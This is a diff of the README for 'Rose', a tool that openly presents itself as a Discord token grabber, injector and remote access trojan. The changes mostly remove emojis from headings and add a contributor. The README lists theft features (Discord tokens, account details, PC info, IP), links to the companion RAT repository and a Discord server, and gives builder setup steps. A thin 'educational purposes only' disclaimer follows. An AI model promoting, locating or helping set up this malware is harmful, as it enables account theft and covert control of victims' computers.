@@ -28,7 +28,7 @@
 <div align="center">
     <br>
     <h1>
-        The best Discord Grabber, Injector and RAT🔒
+        The best Discord Grabber, Injector and RAT
     </h1>
     <strong><a href="https://discord.gg/GJRfqrHVVw">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
 </div>
@@ -56,11 +56,11 @@
 - **[🦹 〢 Credits](#credits)**
 - **[🧾 〢 License](#lisence)**
 
-## <a id="description"></a> 📖 〢 Description
+## <a id="description"></a>Description
 
 Rose is a powerful multipurposes grabber, injector & include a [RAT](https://github.com/DamagingRose/Rose-RAT)
 
-## <a id="features"></a> 🔰 〢 Features
+## <a id="features"></a>Features
 
 - `Logs Discord Token and Discord Account Info`🟢
 - `Logs PC Info and IP`🟢
@@ -80,11 +80,11 @@ Rose is a powerful multipurposes grabber, injector & include a [RAT](https://git
 
 🟢 = Working | 🟡 = To Do | 🟣 = Working on it | 🔴 = Not Working
 
-## <a id="rose_rat"></a> 💀 〢 Rose RAT
+## <a id="rose_rat"></a>Rose RAT
 
 To use the rat, check [this](https://github.com/DamagingRose/Rose-RAT)
 
-### <a id="prerequisites"></a> 💻 〢 Prerequisites
+### <a id="prerequisites"></a>Prerequisites
 
 - Windows 7/10/11
 
@@ -93,7 +93,7 @@ To use the rat, check [this](https://github.com/DamagingRose/Rose-RAT)
 - **[Python](https://www.python.org)**
 - PyPi requirements
 
-### <a id="setup"></a> ⚙️ 〢 Setup
+### <a id="setup"></a>Setup
 
 Don't forget that the project is still under development release and might contain bugs.
 
@@ -101,14 +101,14 @@ Don't forget that the project is still under development release and might conta
 - Run the `builer.bat` to open up the Rose builder/Python installer.
 - Enjoy!
 
-## <a id="preview"></a> 📷 〢 Preview
+## <a id="preview"></a>Preview
 
 ![V8](readme/v8.png)
 ![Grabber](readme/grabber.png)
 ![Injector](readme/injector.png)
 ![Locations](readme/locationss.png)
 
-## <a id="changelog"></a> 📚 〢 Changelog
+## <a id="changelog"></a>Changelog
 
 ```
 [1.1] - 2023-06-12
@@ -126,30 +126,31 @@ First Release
 - Made the first version of the RAT
 ```
 
-## <a id="contributs"></a> 🥷 〢 Contributors
+## <a id="contributs"></a>Contributors
 
 <a href="https://github.com/DamagingRose/Rose-Injector/graphs/contributors">
   <img src="https://contrib.rocks/image?repo=DamagingRose/Rose-Injector" />
 </a>
 
-## <a id="bugsorerrors"></a> ⚠️ 〢 Bugs Or Errors?
+## <a id="bugsorerrors"></a>Bugs Or Errors?
 
 - To Report An Error Make An **[Issue](https://github.com/DamagingRose/Rose-Injector/issues)**
 - Or Join The **[Discord](https://discord.gg/GJRfqrHVVw)**
 
-## <a id="history"></a> ⭐ 〢 History
+## <a id="history"></a>History
 
 - 2023-04-19 - xpierroz finally starts again the project
 - 2023-03-26 - xpierroz's last commit before quitting, svn and suegdu quitted then
 - 2023-03-21 - The first version is finally out
 - 2023-03-10 - The repository is created
 
-## <a id="credits"></a> 🦹 〢 Credits
+## <a id="credits"></a>Credits
 
 - [xpierroz](https://github.com/xpierroz)
 - [Gumbobrot](https://github.com/Gumbobrot)
 - [suegdu](https://github.com/suegdu)
 - [svn](https://github.com/suvan1911)
+- [skid](https://github.com/I-Skid)
 
 External credits:
 
@@ -161,7 +162,7 @@ External credits:
 
 [![Star History Chart](https://api.star-history.com/svg?repos=DamagingRose/RoseRAT,DamagingRose/Rose-Injector&type=Date)](https://star-history.com/#DamagingRose/RoseRAT&DamagingRose/Rose-Injector&Date)
 
-## 🧾 <a id="lisence"></a> 〢 License
+## <a id="lisence"></a> License
 
 ### This is for educational purposes only, use at your own risk, I am not responsible for any of your actions!
 
